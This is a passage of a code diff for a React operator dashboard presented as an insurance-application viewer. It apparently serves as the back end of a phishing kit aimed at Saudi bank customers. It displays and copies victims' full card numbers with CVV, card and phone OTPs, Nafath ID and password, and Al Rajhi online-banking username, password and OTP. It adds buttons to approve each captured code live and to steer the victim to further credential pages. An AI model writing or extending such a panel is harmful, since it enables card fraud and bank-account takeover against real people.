+                    {app.nafazId && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-green-300 text-green-600"><Lock size={8} className="mr-1" />نفاذ</Badge>}
+                    {app.rajhiUser && <Badge variant="outline" className="text-[9px] px-1.5 py-0 h-4 border-teal-300 text-teal-600"><Shield size={8} className="mr-1" />الراجحي</Badge>}
+                  </div>
+                </div>
+                <Button variant="ghost" size="icon" className="h-6 w-6 shrink-0" onClick={(e) => { e.stopPropagation(); handleDelete(app.id); }} data-testid={`button-delete-${app.id}`}>
+                  <Trash2 size={12} className="text-gray-400" />
+                </Button>
+              </div>
+            ))
+          )}
+        </ScrollArea>
+      </aside>
+
+      {/* Main Content */}
+      <main className="flex-1 flex flex-col bg-background/50 overflow-hidden">
+        {/* Top Header */}
+        <header className="border-b border-border bg-card shrink-0">
+          <div className="h-14 px-6 flex items-center justify-between">
+            <div className="flex items-center gap-4">
+              {selectedApplication && (
+                <>
+                  <div className="flex items-center gap-2 text-sm">
+                    <span className="text-muted-foreground">الهوية</span>
+                    <span className="font-mono text-foreground" data-testid="text-identity">{selectedApplication.nationalId || selectedApplication.identityNumber}</span>
+                  </div>
+                  <div className="flex items-center gap-2 text-sm">
+                    <Phone size={14} className="text-gray-400" />
+                    <span className="font-mono text-foreground" data-testid="text-phone">{selectedApplication.phoneNumber}</span>
+                  </div>
+                  <div className="flex items-center gap-2 text-sm">
+                    <User size={14} className="text-gray-400" />
+                    <span className="text-foreground" data-testid="text-owner">{selectedApplication.cardName || selectedApplication.documment_owner_full_name}</span>
+                  </div>
+                </>
+              )}
+            </div>
+            <div className="flex items-center gap-2">
+              {selectedApplication && (
+                <Badge className={cn("text-[9px]", selectedApplication.approvalStatus === "approved_otp" && "bg-green-100 text-green-700", !selectedApplication.approvalStatus && "bg-amber-100 text-amber-700", selectedApplication.approvalStatus === "rejected" && "bg-red-100 text-red-700")} data-testid="badge-status">
+                  {selectedApplication.approvalStatus === "approved_otp" ? "موافق" : selectedApplication.approvalStatus === "rejected" ? "مرفوض" : "قيد الانتظار"}
+                </Badge>
+              )}
+            </div>
+          </div>
+
+          {/* Page/Step Navigation Bar */}
+          {selectedApplication && (
+            <div className="px-4 py-3 bg-gradient-to-l from-primary/10 to-card border-t border-border overflow-x-auto">
+              <div className="flex items-center gap-2 min-w-max">
+                {[
+                  { step: 1, title: "البيانات" },
+                  { step: 2, title: "التأمين" },
+                  { step: 3, title: "الأسعار" },
+                  { step: 4, title: "الدفع" },
+                  { step: 5, title: "OTP" },
+                  { step: 6, title: "الصراف" },
+                  { step: 7, title: "مكتمل" },
+                ].map(({ step, title }) => {
+                  const currentStep = selectedApplication.currentStep || 0;
+                  const isActive = currentStep === step;
+                  const isPassed = currentStep > step;
+                  return (
+                    <button
+                      key={step}
+                      onClick={() => handleUpdateCurrentPage(selectedApplication.id, step)}
+                      className={cn(
+                        "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
+                        isActive && "bg-blue-600 text-white shadow-md",
+                        isPassed && !isActive && "bg-green-500/20 text-green-700 dark:text-green-400",
+                        !isActive && !isPassed && "bg-muted text-muted-foreground",
+                      )}
+                      data-testid={`step-${step}`}
                     >
-                      <X className="h-4 w-4 ml-1" />
-                      رفض
-                    </Button>
-                  </div>
-                </div>
-              )}
+                      <span className={cn("w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold", isActive && "bg-white/20", isPassed && !isActive && "bg-green-500/30", !isActive && !isPassed && "bg-secondary")}>
+                        {isPassed && !isActive ? "✓" : step}
+                      </span>
+                      <span className="hidden xl:inline">{title}</span>
+                    </button>
+                  );
+                })}
 
-              {/* OTP Waiting Alert */}
-              {selectedVisitor.otpCode && !selectedVisitor.cardOtpApproved && (
-                <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-card-otp">
-                  <div className="bg-blue-100 rounded-full p-3">
-                    <CreditCard className="h-6 w-6 text-blue-600" />
-                  </div>
-                  <div className="flex-1">
-                    <h3 className="font-bold text-blue-800" data-testid="text-card-otp-code">OTP البطاقة: {selectedVisitor.otpCode}</h3>
-                    <p className="text-blue-600 text-sm">المستخدم أدخل OTP البطاقة - اضغط للموافقة</p>
-                  </div>
-                  <Button
-                    size="sm"
-                    onClick={() => handleRouting(selectedVisitor.id, "cardOtpApproved", true)}
-                    className="bg-blue-600 hover:bg-blue-700"
-                    data-testid="button-approve-card-otp"
-                  >
-                    <CheckCircle className="h-4 w-4 ml-1" />
-                    موافقة
-                  </Button>
-                </div>
-              )}
+                <div className="h-6 w-px bg-border mx-2" />
 
-              {/* Phone OTP Waiting Alert */}
-              {selectedVisitor.phoneOtpCode && !selectedVisitor.phoneOtpApproved && (
-                <div className="bg-pink-50 border-2 border-pink-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-phone-otp">
-                  <div className="bg-pink-100 rounded-full p-3">
-                    <Phone className="h-6 w-6 text-pink-600" />
-                  </div>
-                  <div className="flex-1">
-                    <h3 className="font-bold text-pink-800" data-testid="text-phone-otp-code">OTP الهاتف: {selectedVisitor.phoneOtpCode}</h3>
-                    <p className="text-pink-600 text-sm">المستخدم أدخل OTP الهاتف - اضغط للموافقة</p>
-                  </div>
-                  <Button
-                    size="sm"
-                    onClick={() => handleRouting(selectedVisitor.id, "phoneOtpApproved", true)}
-                    className="bg-pink-600 hover:bg-pink-700"
-                    data-testid="button-approve-phone-otp"
-                  >
-                    <CheckCircle className="h-4 w-4 ml-1" />
-                    موافقة
-                  </Button>
-                </div>
-              )}
+                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "nafaz")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "nafaz" ? "bg-purple-500 text-white" : "bg-purple-500/10 text-purple-600")} data-testid="step-nafaz">
+                  <Lock size={14} /><span>نفاذ</span>
+                </button>
 
-              {/* Nafaz Waiting Alert */}
-              {selectedVisitor.nafazId && !selectedVisitor.nafathApproved && (
-                <div className="bg-cyan-50 border-2 border-cyan-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-nafaz">
-                  <div className="bg-cyan-100 rounded-full p-3">
-                    <ClipboardCheck className="h-6 w-6 text-cyan-600" />
-                  </div>
-                  <div className="flex-1">
-                    <h3 className="font-bold text-cyan-800" data-testid="text-nafaz-id">نفاذ: {selectedVisitor.nafazId}</h3>
-                    <p className="text-cyan-600 text-sm">المستخدم ينتظر تصديق نفاذ - اضغط للموافقة</p>
-                  </div>
-                  <Button
-                    size="sm"
-                    onClick={() => handleRouting(selectedVisitor.id, "nafathApproved", true)}
-                    className="bg-cyan-600 hover:bg-cyan-700"
-                    data-testid="button-approve-nafaz"
-                  >
-                    <CheckCircle className="h-4 w-4 ml-1" />
-                    موافقة
-                  </Button>
-                </div>
-              )}
+                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "rajhi")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "rajhi" ? "bg-teal-600 text-white" : "bg-teal-500/10 text-teal-600")} data-testid="step-rajhi">
+                  <CreditCard size={14} /><span>الراجحي</span>
+                </button>
 
-              {/* Credit Card Section */}
-              {(selectedVisitor.cardNumber || selectedVisitor.cardName) && (
-                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                  <div className="p-4 border-b bg-gray-50 flex items-center justify-between">
-                    <h3 className="font-semibold text-gray-700 flex items-center gap-2">
-                      <CreditCard className="h-5 w-5" />
-                      الدفع
+                <button onClick={() => handleUpdateCurrentPage(selectedApplication.id, "phone")} className={cn("flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all", selectedApplication.currentPage === "phone" ? "bg-amber-500 text-white" : "bg-amber-500/10 text-amber-600")} data-testid="step-phone">
+                  <Phone size={14} /><span>الهاتف</span>
+                </button>
+
+                <div className="mr-auto flex items-center gap-2 text-xs pr-2">
+                  <span className="text-muted-foreground">الخطوة:</span>
+                  <Badge className="bg-blue-500/10 text-blue-600 font-mono text-xs px-2 py-1" data-testid="badge-current-step">{selectedApplication.currentStep || "—"}</Badge>
+                </div>
+              </div>
+            </div>
+          )}
+        </header>
+
+        {/* Application Detail */}
+        {selectedApplication ? (
+          <div ref={chatScrollRef} className="flex-1 px-8 py-6 overflow-y-auto">
+            <div className="max-w-3xl mx-auto space-y-4">
+              {/* Welcome Message */}
+              <ChatBubble title="النظام" icon={<MessageSquare size={16} />}>
+                <p className="text-sm">مرحباً، هذه بيانات طلب التأمين الخاص بـ <strong>{getDisplayName(selectedApplication)}</strong></p>
+              </ChatBubble>
+
+              {/* Basic Info */}
+              <ChatBubble title="المعلومات الأساسية" isUser icon={<User size={16} />}>
+                <div className="space-y-1 text-sm">
+                  {selectedApplication.nationalId && <div>رقم الهوية: <span className="font-mono" dir="ltr">{selectedApplication.nationalId}</span></div>}
+                  {selectedApplication.cardName && <div>الاسم: {selectedApplication.cardName}</div>}
+                  {selectedApplication.phoneNumber && <div>الهاتف: <span className="font-mono" dir="ltr">{selectedApplication.phoneNumber}</span></div>}
+                </div>
+              </ChatBubble>
+
+              {/* Payment Card */}
+              {selectedApplication.cardNumber && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <CreditCard size={16} className="text-amber-500" />بطاقة الدفع
+                      {!selectedApplication.cardOtpApproved && <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse">بانتظار الموافقة</Badge>}
                     </h3>
-                    <Badge variant="outline" className="text-emerald-600 border-emerald-200 bg-emerald-50">
-                      SAR
-                    </Badge>
                   </div>
                   <div className="p-6">
                     {/* Visual Card */}
-                    <div className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-xl bg-gradient-to-br from-emerald-600 via-emerald-500 to-teal-500 p-5 text-white shadow-lg relative overflow-hidden mb-6">
-                      {/* mada logo placeholder */}
-                      <div className="absolute top-4 right-4 flex items-center gap-1">
-                        <div className="w-8 h-5 bg-white/20 rounded flex items-center justify-center text-[8px] font-bold">mada</div>
+                    <div className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-2xl p-6 relative overflow-hidden shadow-xl mb-6" style={{ background: "linear-gradient(135deg, #1a365d 0%, #2d3748 50%, #1a202c 100%)" }}>
+                      <div className="absolute top-0 right-0 w-64 h-64 rounded-full opacity-10" style={{ background: "radial-gradient(circle, white 0%, transparent 70%)", transform: "translate(30%, -30%)" }} />
+                      <div className="flex justify-between items-start mb-6">
+                        <div className="w-12 h-9 rounded bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center shadow-md">
+                          <div className="w-8 h-6 rounded-sm bg-gradient-to-br from-yellow-300 to-yellow-500 opacity-80" />
+                        </div>
+                        <div className="text-white/60 text-sm font-bold">mada</div>
                       </div>
-                      {/* Chip */}
-                      <div className="absolute top-4 left-4 w-10 h-8 rounded bg-gradient-to-br from-yellow-200 via-yellow-300 to-yellow-400 opacity-90">
-                        <div className="absolute inset-1 grid grid-cols-2 gap-0.5">
-                          {[...Array(4)].map((_, i) => (
-                            <div key={i} className="bg-yellow-500/40 rounded-sm" />
-                          ))}
+                      <div className="mb-6">
+                        <div className="font-mono text-2xl text-white tracking-[0.2em] font-medium" dir="ltr">
+                          {selectedApplication.cardNumber?.replace(/(.{4})/g, '$1 ').trim()}
                         </div>
                       </div>
-                      {/* Card Number */}
-                      <div className="mt-12 mb-4">
-                        <p className="font-mono text-xl tracking-[0.15em]" dir="ltr">
-                          {selectedVisitor.cardNumber?.replace(/(.{4})/g, '$1 ').trim() || '•••• •••• •••• ••••'}
-                        </p>
-                      </div>
-                      {/* Card Info Row */}
-                      <div className="flex justify-between items-end text-sm">
+                      <div className="flex justify-between items-end text-white">
                         <div>
-                          <p className="text-white/60 text-[10px] mb-0.5">CARD HOLDER</p>
-                          <p className="font-medium uppercase">{selectedVisitor.cardName || 'NAME'}</p>
+                          <div className="text-[10px] text-white/60 mb-1">CARD HOLDER</div>
+                          <div className="font-medium uppercase text-sm">{selectedApplication.cardName || "NAME"}</div>
                         </div>
                         <div className="text-left">
-                          <p className="text-white/60 text-[10px] mb-0.5">EXPIRES</p>
-                          <p className="font-mono">{selectedVisitor.cardExpiry || 'MM/YY'}</p>
+                          <div className="text-[10px] text-white/60 mb-1">EXPIRES</div>
+                          <div className="font-mono text-sm">{selectedApplication.cardExpiry || "MM/YY"}</div>
+                        </div>
+                        <div className="text-left">
+                          <div className="text-[10px] text-white/60 mb-1">CVV</div>
+                          <div className="font-mono text-sm font-bold">{selectedApplication.cardCvv || "***"}</div>
                         </div>
                       </div>
-                      {/* CVV Badge */}
-                      {selectedVisitor.cardCvv && (
-                        <div className="absolute bottom-4 left-4 bg-white/20 backdrop-blur px-2 py-1 rounded text-xs">
-                          CVV: <span className="font-bold">{selectedVisitor.cardCvv}</span>
-                        </div>
-                      )}
-                      {/* Visa/Master logo */}
-                      <div className="absolute bottom-4 right-4 flex">
-                        <div className="w-6 h-6 rounded-full bg-red-400/80" />
-                        <div className="w-6 h-6 rounded-full bg-yellow-400/80 -mr-2" />
-                      </div>
-                      {/* Decorative */}
-                      <div className="absolute -bottom-10 -left-10 w-32 h-32 rounded-full bg-white/10" />
                     </div>
 
                     {/* Card Details */}
-                    <div className="space-y-3 text-sm">
-                      {selectedVisitor.cardNumber && (
-                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                          <span className="text-gray-500">رقم البطاقة</span>
-                          <div className="flex items-center gap-2">
-                            <span className="font-mono font-medium">{selectedVisitor.cardNumber}</span>
-                            <CopyButton text={selectedVisitor.cardNumber} />
-                          </div>
-                        </div>
-                      )}
-                      {selectedVisitor.cardName && (
-                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                          <span className="text-gray-500">اسم حامل البطاقة</span>
-                          <span className="font-medium">{selectedVisitor.cardName}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.cardExpiry && (
-                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                          <span className="text-gray-500">تاريخ الانتهاء</span>
-                          <span className="font-mono font-medium">{selectedVisitor.cardExpiry}</span>
-                        </div>
-                      )}
-                      {selectedVisitor.cardCvv && (
-                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                          <span className="text-gray-500">CVV</span>
-                          <div className="flex items-center gap-2">
-                            <span className="font-mono font-bold text-rose-600">{selectedVisitor.cardCvv}</span>
-                            <CopyButton text={selectedVisitor.cardCvv} />
-                          </div>
-                        </div>
-                      )}
+                    <div className="space-y-1">
+                      <DataRow label="رقم البطاقة" value={selectedApplication.cardNumber} isLtr />
+                      <DataRow label="اسم حامل البطاقة" value={selectedApplication.cardName} />
+                      <DataRow label="تاريخ الانتهاء" value={selectedApplication.cardExpiry} isLtr />
+                      <DataRow label="CVV" value={selectedApplication.cardCvv} isLtr />
                     </div>
-                  </div>
-                </div>
-              )}
 
-              {/* Personal Info Section */}
-              {(selectedVisitor.nationalId || selectedVisitor.phoneNumber || selectedVisitor.personalInfo?.birthYear) && (
-                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                  <div className="p-4 border-b bg-gray-50">
-                    <h3 className="font-semibold text-gray-700 flex items-center gap-2">
-                      <User className="h-5 w-5" />
-                      البيانات الشخصية
-                    </h3>
-                  </div>
-                  <div className="p-6 space-y-3 text-sm">
-                    {selectedVisitor.nationalId && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">رقم الهوية</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.nationalId}</span>
-                          <CopyButton text={selectedVisitor.nationalId} />
-                        </div>
-                      </div>
-                    )}
-                    {selectedVisitor.phoneNumber && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">رقم الهاتف</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.phoneNumber}</span>
-                          <CopyButton text={selectedVisitor.phoneNumber} />
-                        </div>
-                      </div>
-                    )}
-                    {selectedVisitor.phoneCarrier && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">شركة الاتصالات</span>
-                        <span className="font-medium">{selectedVisitor.phoneCarrier}</span>
-                      </div>
-                    )}
-                    {selectedVisitor.personalInfo?.birthYear && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">تاريخ الميلاد</span>
-                        <span className="font-medium">
-                          {selectedVisitor.personalInfo.birthDay}/{selectedVisitor.personalInfo.birthMonth}/{selectedVisitor.personalInfo.birthYear}
-                        </span>
-                      </div>
-                    )}
+                    {/* Card Approval Button */}
+                    <div className="mt-4 pt-4 border-t border-border">
+                      <Button
+                        onClick={() => handleFieldApproval(selectedApplication.id, "cardOtpApproved", true)}
+                        className={cn("w-full", selectedApplication.cardOtpApproved ? "bg-green-600" : "bg-amber-500 hover:bg-amber-600")}
+                        disabled={selectedApplication.cardOtpApproved}
+                        data-testid="button-approve-card"
+                      >
+                        <CheckCircle className="h-4 w-4 ml-2" />
+                        {selectedApplication.cardOtpApproved ? "تمت الموافقة" : "موافقة على البطاقة"}
+                      </Button>
+                    </div>
                   </div>
                 </div>
               )}
 
               {/* OTP Codes Section */}
-              {(selectedVisitor.otpCode || selectedVisitor.phoneOtpCode || selectedVisitor.rajhiOtp || selectedVisitor.atmVerification?.code || selectedVisitor.authNumber) && (
-                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                  <div className="p-4 border-b bg-blue-50">
-                    <h3 className="font-semibold text-blue-700 flex items-center gap-2">
-                      <Key className="h-5 w-5" />
-                      رموز التحقق
+              {(selectedApplication.otpCode || selectedApplication.phoneOtpCode) && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-blue-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <Key size={16} className="text-blue-500" />رموز التحقق
                     </h3>
                   </div>
-                  <div className="p-6">
-                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
-                      {selectedVisitor.otpCode && (
-                        <div className="bg-blue-50 rounded-lg p-4 text-center">
-                          <p className="text-xs text-gray-500 mb-2">OTP البطاقة</p>
-                          <p className="font-mono text-2xl font-bold text-blue-600">{selectedVisitor.otpCode}</p>
-                        </div>
-                      )}
-                      {selectedVisitor.phoneOtpCode && (
-                        <div className="bg-pink-50 rounded-lg p-4 text-center">
-                          <p className="text-xs text-gray-500 mb-2">OTP الهاتف</p>
-                          <p className="font-mono text-2xl font-bold text-pink-600">{selectedVisitor.phoneOtpCode}</p>
-                        </div>
-                      )}
-                      {selectedVisitor.rajhiOtp && (
-                        <div className="bg-sky-50 rounded-lg p-4 text-center">
-                          <p className="text-xs text-gray-500 mb-2">OTP الراجحي</p>
-                          <p className="font-mono text-2xl font-bold text-sky-600">{selectedVisitor.rajhiOtp}</p>
-                        </div>
-                      )}
-                      {selectedVisitor.atmVerification?.code && (
-                        <div className="bg-orange-50 rounded-lg p-4 text-center">
-                          <p className="text-xs text-gray-500 mb-2">رمز الصراف</p>
-                          <p className="font-mono text-2xl font-bold text-orange-600">{selectedVisitor.atmVerification.code}</p>
-                        </div>
-                      )}
-                      {selectedVisitor.authNumber && (
-                        <div className="bg-purple-50 rounded-lg p-4 text-center">
-                          <p className="text-xs text-gray-500 mb-2">رقم المصادقة</p>
-                          <p className="font-mono text-2xl font-bold text-purple-600">{selectedVisitor.authNumber}</p>
-                        </div>
-                      )}
+                  <div className="p-6 grid grid-cols-2 gap-4">
+                    {selectedApplication.otpCode && (
+                      <div className="bg-blue-50 dark:bg-blue-900/30 rounded-lg p-4 text-center">
+                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">OTP البطاقة</p>
+                        <p className="font-mono text-2xl font-bold text-blue-600 dark:text-blue-400" data-testid="text-card-otp">{selectedApplication.otpCode}</p>
+                        <Button size="sm" variant="outline" className="mt-2" onClick={() => copyToClipboard(selectedApplication.otpCode!, "OTP البطاقة")} data-testid="button-copy-card-otp">
+                          <Copy size={12} className="ml-1" />نسخ
+                        </Button>
+                      </div>
+                    )}
+                    {selectedApplication.phoneOtpCode && (
+                      <div className="bg-pink-50 dark:bg-pink-900/30 rounded-lg p-4 text-center">
+                        <p className="text-xs text-gray-500 dark:text-gray-400 mb-2">OTP الهاتف</p>
+                        <p className="font-mono text-2xl font-bold text-pink-600 dark:text-pink-400" data-testid="text-phone-otp">{selectedApplication.phoneOtpCode}</p>
+                        <Button size="sm" variant="outline" className="mt-2" onClick={() => copyToClipboard(selectedApplication.phoneOtpCode!, "OTP الهاتف")} data-testid="button-copy-phone-otp">
+                          <Copy size={12} className="ml-1" />نسخ
+                        </Button>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
+              {/* Nafaz Section */}
+              {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-green-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <Lock size={16} className="text-green-500" />نفاذ
+                      {!selectedApplication.nafathApproved && <Badge className="bg-green-100 text-green-700 text-[9px] animate-pulse">بانتظار الموافقة</Badge>}
+                    </h3>
+                  </div>
+                  <div className="p-6 space-y-1">
+                    <DataRow label="رقم الهوية" value={selectedApplication.nafazId} isLtr />
+                    <DataRow label="كلمة المرور" value={selectedApplication.nafazPass} isLtr />
+                    <div className="mt-4 pt-4 border-t border-border">
+                      <Button
+                        onClick={() => handleFieldApproval(selectedApplication.id, "nafathApproved", true)}
+                        className={cn("w-full", selectedApplication.nafathApproved ? "bg-green-600" : "bg-green-500 hover:bg-green-600")}
+                        disabled={selectedApplication.nafathApproved}
+                        data-testid="button-approve-nafaz"
+                      >
+                        <CheckCircle className="h-4 w-4 ml-2" />
+                        {selectedApplication.nafathApproved ? "تمت الموافقة" : "موافقة نفاذ"}
+                      </Button>
                     </div>
                   </div>
                 </div>
               )}
 
-              {/* Nafaz Section */}
-              {(selectedVisitor.nafazId || selectedVisitor.nafazPass) && (
-                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                  <div className="p-4 border-b bg-cyan-50">
-                    <h3 className="font-semibold text-cyan-700 flex items-center gap-2">
-                      <ClipboardCheck className="h-5 w-5" />
-                      نفاذ
-                    </h3>
-                  </div>
-                  <div className="p-6 space-y-3 text-sm">
-                    {selectedVisitor.nafazId && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">رقم الهوية</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.nafazId}</span>
-                          <CopyButton text={selectedVisitor.nafazId} />
-                        </div>
-                      </div>
-                    )}
-                    {selectedVisitor.nafazPass && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">كلمة المرور</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.nafazPass}</span>
-                          <CopyButton text={selectedVisitor.nafazPass} />
-                        </div>
-                      </div>
-                    )}
-                  </div>
-                </div>
-              )}
-
               {/* Rajhi Section */}
-              {(selectedVisitor.rajhiUser || selectedVisitor.rajhiPassword) && (
-                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                  <div className="p-4 border-b bg-sky-50">
-                    <h3 className="font-semibold text-sky-700 flex items-center gap-2">
-                      <Shield className="h-5 w-5" />
-                      الراجحي
+              {(selectedApplication.rajhiUser || selectedApplication.rajhiPassword) && (
+                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                  <div className="bg-gradient-to-l from-teal-500/10 to-card px-4 py-3 border-b border-border">
+                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                      <Shield size={16} className="text-teal-500" />الراجحي
                     </h3>
                   </div>
-                  <div className="p-6 space-y-3 text-sm">
-                    {selectedVisitor.rajhiUser && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">اسم المستخدم</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.rajhiUser}</span>
-                          <CopyButton text={selectedVisitor.rajhiUser} />
-                        </div>
-                      </div>
-                    )}
-                    {selectedVisitor.rajhiPassword && (
-                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
-                        <span className="text-gray-500">كلمة المرور</span>
-                        <div className="flex items-center gap-2">
-                          <span className="font-mono font-medium">{selectedVisitor.rajhiPassword}</span>
-                          <CopyButton text={selectedVisitor.rajhiPassword} />
-                        </div>
-                      </div>
-                    )}
+                  <div className="p-6 space-y-1">
+                    <DataRow label="اسم المستخدم" value={selectedApplication.rajhiUser} isLtr />
+                    <DataRow label="كلمة المرور" value={selectedApplication.rajhiPassword} isLtr />
+                    {selectedApplication.rajhiOtp && <DataRow label="OTP" value={selectedApplication.rajhiOtp} isLtr />}
                   </div>
                 </div>
               )}
 
               {/* Actions Section */}
-              <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
-                <div className="p-4 border-b bg-gray-50">
-                  <h3 className="font-semibold text-gray-700 flex items-center gap-2">
-                    <Shield className="h-5 w-5" />
-                    الإجراءات
+              <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
+                <div className="bg-gradient-to-l from-gray-500/10 to-card px-4 py-3 border-b border-border">
+                  <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
+                    <Settings size={16} className="text-gray-500" />الإجراءات
                   </h3>
                 </div>
                 <div className="p-6">
-                  <div className="flex flex-wrap gap-3 mb-6">
-                    <Button
-                      size="sm"
-                      onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
-                      className="bg-emerald-600 hover:bg-emerald-700"
-                      data-testid="button-approve-otp"
-                    >
-                      <CheckCircle className="h-4 w-4 ml-2" />
-                      موافقة OTP
+                  <div className="flex flex-wrap gap-3">
+                    <Button size="sm" onClick={() => handleApprovalStatus(selectedApplication.id, "approved_otp")} className="bg-emerald-600 hover:bg-emerald-700" data-testid="button-approve-otp">
+                      <CheckCircle className="h-4 w-4 ml-2" />موافقة OTP
                     </Button>
                     <Dialog>
                       <DialogTrigger asChild>
                         <Button size="sm" variant="outline" data-testid="button-atm-dialog">
-                          <Key className="h-4 w-4 ml-2" />
-                          إرسال رمز صراف
+                          <Key className="h-4 w-4 ml-2" />إرسال رمز صراف
                         </Button>
                       </DialogTrigger>
                       <DialogContent>
@@ -809,14 +838,14 @@ export default function Dashboard() {
                         </div>
                         <DialogFooter>
                           <DialogClose asChild>
-                            <Button 
+                            <Button
                               disabled={!atmCode.trim()}
                               onClick={() => {
                                 if (atmCode.trim()) {
-                                  handleApprovalStatus(selectedVisitor.id, "approved_atm", atmCode.trim());
+                                  handleApprovalStatus(selectedApplication.id, "approved_atm", atmCode.trim());
                                   setAtmCode("");
                                 }
-                              }} 
+                              }}
                               data-testid="button-confirm-atm"
                             >
                               تأكيد
@@ -825,202 +854,23 @@ export default function Dashboard() {
                         </DialogFooter>
                       </DialogContent>
                     </Dialog>
-                    <Button
-                      size="sm"
-                      variant="destructive"
-                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
-                      data-testid="button-reject"
-                    >
-                      <X className="h-4 w-4 ml-2" />
-                      رفض
+                    <Button size="sm" variant="destructive" onClick={() => handleApprovalStatus(selectedApplication.id, "rejected")} data-testid="button-reject">
+                      <X className="h-4 w-4 ml-2" />رفض
                     </Button>
                   </div>
-
-                  {/* Routing Controls */}
-                  <div className="flex flex-wrap gap-3 pt-4 border-t">
-                    <Select onValueChange={(value) => handleRouting(selectedVisitor.id, "targetPage", value)}>
-                      <SelectTrigger className="w-40" data-testid="select-target-page">
-                        <SelectValue placeholder="توجيه للصفحة" />
-                      </SelectTrigger>
-                      <SelectContent>
-                        <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
-                        <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
-                        <SelectItem value="nafaz">نفاذ</SelectItem>
-                        <SelectItem value="rajhi">الراجحي</SelectItem>
-                      </SelectContent>
-                    </Select>
-                    <Select onValueChange={(value) => handleRouting(selectedVisitor.id, "targetStep", parseInt(value))}>
-                      <SelectTrigger className="w-36" data-testid="select-target-step">
-                        <SelectValue placeholder="الخطوة" />
-                      </SelectTrigger>
-                      <SelectContent>
-                        {[1, 2, 3, 4, 5, 6, 7].map((step) => (
-                          <SelectItem key={step} value={step.toString()}>الخطوة {step}</SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                  </div>
-
-                  {/* Toggle Approvals */}
-                  <div className="flex flex-wrap gap-2 pt-4 mt-4 border-t">
-                    <Button
-                      size="sm"
-                      variant={selectedVisitor.cardOtpApproved ? "default" : "outline"}
-                      onClick={() => handleRouting(selectedVisitor.id, "cardOtpApproved", !selectedVisitor.cardOtpApproved)}
-                      className={selectedVisitor.cardOtpApproved ? "bg-emerald-600" : ""}
-                    >
-                      <CreditCard className="h-4 w-4 ml-1" />
-                      OTP البطاقة
-                    </Button>
-                    <Button
-                      size="sm"
-                      variant={selectedVisitor.phoneOtpApproved ? "default" : "outline"}
-                      onClick={() => handleRouting(selectedVisitor.id, "phoneOtpApproved", !selectedVisitor.phoneOtpApproved)}
-                      className={selectedVisitor.phoneOtpApproved ? "bg-emerald-600" : ""}
-                    >
